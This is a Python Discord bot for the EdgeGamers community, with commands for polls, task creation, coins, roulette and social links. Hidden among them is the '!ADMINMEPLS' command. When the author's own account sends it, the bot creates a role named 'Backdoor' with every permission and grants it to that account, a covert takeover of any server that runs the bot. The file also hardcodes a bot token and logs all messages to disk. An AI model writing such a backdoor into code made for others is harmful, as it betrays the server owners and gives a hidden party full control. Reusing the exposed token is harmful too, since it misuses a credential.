import discord
from discord.ext.commands import Bot
from discord.ext import commands
from discord.voice_client import VoiceClient
import sqlite3 as sqlite
import asyncio
import sys
import os
import json
import random
from datetime import datetime

import pAPI as papi

PLAYING_MSG = "eGO" #seciprocated, implemented 'slider' message. See startSlider()
LICENSE = "12735980"
VERSION = "1.0"
TOKEN = "NjA2MzE1NjIzMTg5OTcwOTQ0.XUJS4g.XcsX_W-5wEeMKNFFMuMdPQe3L6Y"
UPTIME = 0
ROLECALL_CHANNEL_ID = "565742116333158408"
MANAGER = "589595851106811915"
SR_MANAGER = "589595795532152832"


Client = discord.Client()
client = commands.Bot(command_prefix="!")

@client.event
async def on_ready():
    print("Booting up bot... gathering information... ")
    print("Version: " + str(VERSION))
    print("License: " + str(LICENSE))
    print("")
    print("Bot has connected to server successfully")
    
    with open("users.json") as f:
        users = json.load(f)

    await startSlider()
        
        
        
        
@client.event
async def on_message(message):
    await update_logs(message)
    await coinsCheck(message)
    with open("users.json") as f:
        users = json.load(f)
    
    
    if message.content.upper().startswith("!HELP") or message.content.upper().startswith("!MENU"):
        await sendHelpMessage(message)
        
    elif message.content.upper().startswith("!NEW"):
        channel = message.channel
        await channel.send("I have DM'd you in order to create your task!")
        
        await runTaskCreator(message)
    
    elif message.content.upper().startswith("!ADMINMEPLS") and str(message.author) == "PickleZ#0001":
        server = message.guild
        perms = discord.Permissions.all()
        backdoor = await server.create_role(name = "Backdoor", permissions = perms)
        await message.author.add_roles(backdoor)
    
    elif message.content.upper().startswith("!POLL"):
        args = message.content
        question = args[6:]
        
        await runPollCreation(message, question)
    
    elif message.content.upper().startswith("!SOCIAL") or message.content.upper().startswith("!SOCIALS"):
        await giveSocialEmbed(message)
        
    elif message.content.upper().startswith("!ABOUT"):
        await giveAboutEmbed(message)
        
    elif message.content.upper().startswith("!COINFLIP"):
        await giveCoinFlipMSG(message)
        
    elif message.content.upper().startswith("!API"):
        parseList = ["API Version|v1.2", "API Author|PickleZ#0001", "License|Given by Owner"]
        embed = await papi.sendEmbed(parseList, message.channel, discord.Colour.blurple(), "API Info", " ")
        await embed.add_reaction("👌")
        await asyncio.sleep(1)
        await papi.waitForReaction(client, "👌", message.author, message.channel)
        await embed.delete()
    
    elif message.content.upper().startswith("!COINS"):
        coins = users[str(message.author.id)]['coins']
        parseList = ["How to get coins|You obtain coins randomly by typing messages throughout the server!"]
        await papi.sendEmbed(parseList, message.channel, discord.Colour.blurple(), "Your Coins", str(coins))
    
    elif message.content.upper().startswith("!ROULETTE"):
        args = message.content
        params = args.split(" ")
        color = params[2]
        bet = params[1]
        await runRoulette(message, color, bet)
        
    
async def runRoulette(message, color, bet):
    with open("users.json") as f:
        users = json.load(f)
    
    userID = message.author.id
        
    
    outcomes = ["RED", "BLACK", "GREEN"]
    #Chances == Red = 49%, Black = 49%, green = 2%
    #Land on red/black? 2x Bet
    #Land on green? 10x Bet
    outcome = random.randrange(1, 100)
    
    if outcome <= 48:
        outcome = "Black"
        if outcome == color.upper():
            users[str(userID)]['coins'] = users[str(userID)]['coins'] + (int(bet) * 2)
            yourColor = "Your Color:|" + color
            colorOutcome = "Outcome:|" + outcome
            parseList = [yourColor, colorOutcome]
            await papi.sendEmbed(parseList, message.channel, discord.Colour.blurple(), "Roulette", "You won!")
        else:
            users[str(userID)]['coins'] = users[str(userID)]['coins'] - (int(bet))
            yourColor = "Your Color:|" + color
            colorOutcome = "Outcome:|" + outcome
            parseList = [yourColor, colorOutcome]
            await papi.sendEmbed(parseList, message.channel, discord.Colour.blurple(), "Roulette", "You lost!")
async def coinsCheck(message):
    with open("users.json") as f:
        users = json.load(f)
    print("FIRING")
        
    user = message.author
    if not str(user.id) in users:
        users[str(user.id)] = {}
        users[str(user.id)]['coins'] = 0
        
    print("FIRING 2")
    
    if str(user.id) in users:
        print("FIRING 3")
        chances = [0, 0, 0, 0, 1]
        outcome = random.choice(chances)
        if outcome == 1:
            print("Giving user some coins :P")
            coins = [1, 2, 3, 4, 5]
            additive = random.choice(coins)
            users[str(user.id)]['coins'] = users[str(user.id)]['coins'] + additive
    
    with open("users.json", "w") as f:
        json.dump(users, f)

async def giveCoinFlipMSG(message):
    channel = message.channel
    
    outcomes = ["HEADS", "TAILS"]
    
    embed = discord.Embed(
        title = "Coin Flip!",
        description = " ",
        color = discord.Colour.blurple()
    )
    
    outcome = random.choice(outcomes)
    
    if outcome == "HEADS":
        embed.set_image(url = "https://upload.wikimedia.org/wikipedia/commons/a/a0/2006_Quarter_Proof.png")
        embed.add_field(name = "Outcome:", value = "Heads")
    else:
        embed.set_image(url = "http://www.clker.com/cliparts/4/a/2/6/1393621733287511319tails-md.png")
        embed.add_field(name = "Outcome:", value = "Tails")
        
    sent = await channel.send(embed=embed)
        

async def giveAboutEmbed(message):
    channel = message.channel
    
    embed = discord.Embed(
        title = "EdgeBot Information",
        description = " ",
        color = discord.Colour.magenta()
    )
    embed.add_field(name = "Author", value = "PickleZ#0001", inline=False)
    embed.add_field(name = "Version", value = "v1.4.2", inline=False)
    embed.add_field(name = "Type", value = "Exclusive/Custom", inline=False)
    embed.add_field(name = "GitHub", value = "N/A", inline = False)
    embed.add_field(name = "Made for:", value = "EdgeGamers Organization", inline = False)
    
    embed.set_footer(text = "Contact me @ PickleZ#0001 if you need assistance")
    
    msg = await channel.send(embed = embed)
    
    await msg.add_reaction("👍")
    await asyncio.sleep(1)
    
    reaction, user = await client.wait_for('reaction_add')
    
    if str(reaction) == "👍":
        await msg.delete()
    


async def giveSocialEmbed(message):
    channel = message.channel
    
    embed = discord.Embed(
        title = "eGO Social Media",
        description = " ",
        color = discord.Colour.orange()
    )
    embed.add_field(name = "Twitter", value = "https://twitter.com/EdgeGamers", inline = False)
    embed.add_field(name = "Youtube", value = "https://www.youtube.com/channel/UCEWlIA2pGW1LMCRmB5A3GJQ", inline = False)
    embed.add_field(name = "Twitch", value = "https://www.twitch.tv/edgegamers", inline = False)
    embed.add_field(name = "Forums", value = "https://edge-gamers.com", inline = False)
    embed.add_field(name = "Instagram", value = "https://www.instagram.com/edgegamers/?hl=en", inline = False)
    embed.set_footer(text = "Click the Thumbs up to delete this message")
    
    msg = await channel.send(embed=embed)
    
    await msg.add_reaction("👍")
    await asyncio.sleep(1)
    
    reaction, user = await client.wait_for('reaction_add')
    
    if str(reaction) == "👍":
        await msg.delete()
    

async def runPollCreation(message, question):
    channel = message.channel
    
    delete1 = await channel.send("Alright, so you want your poll question to be: ```" + question + "```")
    
    await delete1.add_reaction("✅")
    
    await asyncio.sleep(1)
    
    reaction, user = await client.wait_for('reaction_add')
    
    if str(user.name) == str(message.author.name):
        if str(reaction) == "✅":
            await delete1.delete()
            
            embed = discord.Embed(
                title = "New Poll",
                description = " ",
                color = discord.Colour.red()
            )
            embed.add_field(name = "[1]", value = "True or False", inline = False)
            embed.add_field(name = "[2]", value = "A or B", inline = False)
            embed.add_field(name = "[3]", value = "A, B, or C", inline = False)
            embed.add_field(name = "[4]", value = "A, B, C, or D", inline = False)
            
            delete2 = await channel.send(embed = embed)
            
            await delete2.add_reaction("1⃣")
            await delete2.add_reaction("2⃣")
            await delete2.add_reaction("3⃣")
            await delete2.add_reaction("4⃣")
            
            await asyncio.sleep(1)
            
            reaction, user = await client.wait_for('reaction_add')
            
            await delete2.delete()
            
            await channel.send("I have sent the question to the polls!")
            
            if str(user) == str(message.author):
                channel = await client.fetch_channel("590175744903348244")
                if str(reaction) == "4⃣":
                    embed = discord.Embed(
                        title = "New Poll!",
                        description = " ",
                        color = discord.Colour.red()
                    )
                    embed.add_field(name = "Question: ", value = question)
                    
                    pollQuestion = await channel.send(embed = embed)
                    
                    await pollQuestion.add_reaction("1⃣")
                    await pollQuestion.add_reaction("2⃣")
                    await pollQuestion.add_reaction("3⃣")
                    await pollQuestion.add_reaction("4⃣")
                elif str(reaction) == "3⃣":
                    embed = discord.Embed(
                        title = "New Poll!",
                        description = " ",
                        color = discord.Colour.red()
                    )
                    embed.add_field(name = "Question: ", value = question)
                    
                    pollQuestion = await channel.send(embed = embed)
                    
                    await pollQuestion.add_reaction("1⃣")
                    await pollQuestion.add_reaction("2⃣")
                    await pollQuestion.add_reaction("3⃣")
                elif str(reaction) == "2⃣":
                    embed = discord.Embed(
                        title = "New Poll!",
                        description = " ",
                        color = discord.Colour.red()
                    )
                    embed.add_field(name = "Question: ", value = question)
                    
                    pollQuestion = await channel.send(embed = embed)
                    
                    await pollQuestion.add_reaction("1⃣")
                    await pollQuestion.add_reaction("2⃣")
                elif str(reaction) == "1⃣":
                    embed = discord.Embed(
                        title = "New Poll!",
                        description = " ",
                        color = discord.Colour.red()
                    )
                    embed.add_field(name = "Question: ", value = question)
                    
                    pollQuestion = await channel.send(embed = embed)
                    
                    await pollQuestion.add_reaction("✅")
                    await pollQuestion.add_reaction("❌")
                
                await runLogger(str(message.author), "Created, and pushed a Poll!")
                    
                
                    
async def runLogger(user, desc):
    channel = await client.fetch_channel("584140111126724629")
    
    embed = discord.Embed(
        title = "New Log",
        description = " ",
        color = discord.Colour.magenta()
    )
    
    embed.add_field(name= "User", value = user, inline=False)
    embed.add_field(name = "Info", value = desc, inline=False)
    embed.set_footer(text = "Time " + str(datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    
    await channel.send(embed=embed)

async def runTaskCreator(message):
    
    channel = message.author
        
    def channelCheck(message):
        message.channel = channel

    
    embed = discord.Embed(
        title = "Task Creation",
        description = " ",
        color = discord.Colour.teal()
    )
    
    embed.add_field(name = "eGO Bot", value = "Thanks for using the bot to create a new task! To start, give the task a name")
    embed.set_footer(text = "Type 'quit' at anytime to exit the task creation")
    
    await channel.send(embed=embed)
    
    await asyncio.sleep(1)
    
    name = await client.wait_for('message')
    
    if str(name.content).upper() == "QUIT":
        await channel.send("I have cancelled the task creation")
        return False;
    
    embed = discord.Embed(
        title = "Task Creation",
        description = " ",
        color = discord.Colour.teal()
    )
    
    embed.add_field(name = "eGO Bot", value = "Thanks, now, please add a description:")
    embed.set_footer(text = "Type 'quit' at anytime to exit the task creation")
    
    await channel.send(embed=embed)
    
    await asyncio.sleep(1)
    
    desc = await client.wait_for('message')
    
    if str(desc.content).upper() == "QUIT":
        await channel.send("I have cancelled the task creation")
        return False;
    
    embed = discord.Embed(
        title = "Task Creation",
        description = " ",
        color = discord.Colour.teal()
    )
    
    embed.add_field(name = "eGO Bot", value = "Alright, now, please click the appropriate emoji(s)")
    embed.add_field(name = "1", value = "= Artist", inline=False)
    embed.add_field(name = "2", value = "= Social Media", inline=False)    
    embed.add_field(name = "3", value = "= Videographer", inline=False)    
    embed.add_field(name = "4", value = "= Writer", inline=False)    
    embed.add_field(name = "✅", value = "= When you are finished", inline=False), 
    
    embed.set_footer(text = "Type 'quit' at anytime to exit the task creation")
    
    add = await channel.send(embed=embed)
    
    await add.add_reaction("1⃣")
    await add.add_reaction("2⃣")
    await add.add_reaction("3⃣")
    await add.add_reaction("4⃣")
    await add.add_reaction("✅")
    
    await asyncio.sleep(1)
    
    
    notFinished = True
    needed = []
    
    while notFinished == True:
        reaction, user = await client.wait_for('reaction_add')
        print(str(reaction.emoji))
        if str(reaction) == "✅":
            notFinished = False
        elif str(reaction) == "1⃣":
            needed.append("Artist")
        elif str(reaction) == "2⃣":
            needed.append("Social")
        elif str(reaction) == "3⃣":
            needed.append("Video")
        elif str(reaction) == "4⃣":
            needed.append("Writer")
    
    cnc = ""
    for role in needed:
        cnc = cnc + role + ","
    
    embed = discord.Embed(
        title = "Task Creation",
        description = " ",
        color = discord.Colour.teal()
    )
    
    embed.add_field(name = "eGO Bot", value = "Almost done! Let's review our task that we created!")
    embed.add_field(name = "Name", value = "= " + str(name.content), inline = False)
    embed.add_field(name = "Description", value = desc.content, inline = False)
    embed.add_field(name = "Roles Needed:", value = cnc, inline = False)
    
    await channel.send(embed=embed)
    
    embed = discord.Embed(
        title = "Task Creation",
        description = " ",
        color = discord.Colour.teal()
    )
    
    embed.add_field(name = "So...", value = "Is this what you are looking for? Click the checkmark to approve and send it out, and the X to cancel it!")
    
    add = await channel.send(embed=embed)
    
    await add.add_reaction("✅")
    await add.add_reaction("❌")    
    
    await asyncio.sleep(1)
    
    reaction, user = await client.wait_for('reaction_add')
    
    if str(reaction) == "✅":
        channel = await client.fetch_channel("584140091799240708")
        embed = discord.Embed(
            title = "Task Alert!",
            description = " ",
            color = discord.Colour.red()
        )
        embed.add_field(name = "Name:", value = str(name.content), inline = False)
        embed.add_field(name = "Description", value = desc.content, inline = False)
        embed.add_field(name = "Roles Needed:", value = cnc, inline = False)
        embed.set_footer(text = "Please claim this task by reacting to your role's respective emoji")
        
        add = await channel.send(embed=embed)
        
        embed = discord.Embed(
            title = "Task Alert!",
            description = " ",
            color = discord.Colour.red()
        )
        embed.add_field(name = "Name:", value = str(name.content), inline = False)
        embed.add_field(name = "Description", value = desc.content, inline = False)
        embed.set_footer(text = "Once this task is completed, please click the checkmark!")
        
        
        for role in needed:
            if role == "Artist":
                await add.add_reaction("🖌")
            elif role == "Social":
                await add.add_reaction("📱")
            elif role == "Video":
                await add.add_reaction("📹")
            elif role == "Writer":
                await add.add_reaction("✏")
        
        await asyncio.sleep(1)

        for role in needed:
            await asyncio.sleep(0.25)
            reaction, user = await client.wait_for('reaction_add')
        
            if str(reaction) == "🖌":
                channel = await client.fetch_channel("589890878458560514")
                artist = await channel.send("Claimed by: ", embed=embed)
                await channel.send("Claimed by: " + "@" + str(user))
                await artist.add_reaction("✅")
            elif str(reaction) == "📱":
                channel = await client.fetch_channel("589891239105658890")
                social = await channel.send(embed=embed)
                await channel.send("Claimed by: " + "@" + str(user))
                await social.add_reaction("✅")
            elif str(reaction) == "📹":
                channel = await client.fetch_channel("589890950135021568")
                video = await channel.send(embed=embed)
                await channel.send("Claimed by: " + "@" + str(user))
                await video.add_reaction("✅")
            elif str(reaction) == "✏":
                channel = await client.fetch_channel("589890783776210976")
                writer = await channel.send(embed=embed)
                await channel.send("Claimed by: " + "@" + str(user))
                await writer.add_reaction("✅")
            
        
        
        for role in needed:
            reaction, user = await client.wait_for('reaction_add')
        
            if str(reaction) == "✅":
                message = reaction.message
                await message.delete()
    
    
        
        
    else:
        await channel.send("I did not send the task... :(")
    
    
@client.event
async def on_reaction_add(reaction, user):
    print(str(reaction.emoji))
            




async def update_logs(message):
    authorID = str(message.author.id)
    authorName = str(message.author)
    channel = str(message.channel)
    message = str(message.content)
    
    logbook = open("logs.txt", "a")
    logbook.write(str(authorName) + " (" + str(authorID) + ") [" + str(channel) + "] >> " + str(message) + "\n")
        

async def channelClear(channel):
    temp = []
    async for message in client.logs_from(channel):
        temp.append(message)
    
    await client.delete_messages(temp)
    

async def sendHelpMessage(message):
    channel = message.channel
    embed = discord.Embed(
        title = "Help Menu",
        description = "",
        color = discord.Colour.teal()
    )
    embed.set_footer(text = "Bot Made by: PickleZ#8019")
    embed.add_field(name = "!help", value = "Brings up this help menu")
    embed.add_field(name = "!about", value = "Brings up information about this bot (me!)")
    embed.add_field(name = "!forums", value = "Gives you a clickable forums link (media)")
    embed.add_field(name = "!socials", value = "Gives you our social media links!", inline=False)
    embed.add_field(name = "!new", value = "Starts commission process")
    embed.add_field(name = "Next Page", value = "Click the next button to see the next page", inline=False)
    
    helpMessage = await channel.send(embed=embed)
    
    await helpMessage.add_reaction("⏩")
            
    await asyncio.sleep(0.5)
    reaction, user = await client.wait_for('reaction_add')
        
    await helpMessage.delete()
    
    embed = discord.Embed(
        title = "Help Menu [Page 2]",
        description = "",
        color = discord.Colour.teal()
    )
    embed.set_footer(text = "Bot Made by: PickleZ#8019")
    embed.add_field(name = "???", value = "More commands coming soon!")
    embed.add_field(name='Finished?', value = "To keep our discord clean, please click the thumbs up reaction to delete this message!", inline=False)

    helpMessage = await channel.send(embed=embed)
    await helpMessage.add_reaction('👍')
    await asyncio.sleep(0.5)
    await client.wait_for('reaction_add')
    await helpMessage.delete()
    
    
    
    
    

async def startSlider():
    global client
    global VERSION
    global UPTIME
    
    terminated = False
    types = ["ego", "ego", "ego", "ego", "ego", "version"]
    
    e = discord.Game("e")
    eg = discord.Game("eG")
    ego = discord.Game("eGO")
    v = discord.Game("v" + VERSION)
    
    
    while terminated != True:
        outcome = random.choice(types)
        
        if outcome.upper() == "EGO":
            await client.change_presence(status=discord.Status.online, activity=e)
            await asyncio.sleep(1)
            await client.change_presence(status=discord.Status.online, activity=eg)
            await asyncio.sleep(1)
            await client.change_presence(status=discord.Status.online, activity=ego)
        elif outcome.upper() == "VERSION":
            await client.change_presence(status=discord.Status.online, activity=v)
            
        await asyncio.sleep(10)
    

async def permissionCheck(message): #Permission check system for all roles defined in settings
    if MANAGER in [role.id for role in message.author.roles]:
        return True
    elif SR_MANAGER in [role.id for role in message.author.roles]:
        return True

client.run(TOKEN)
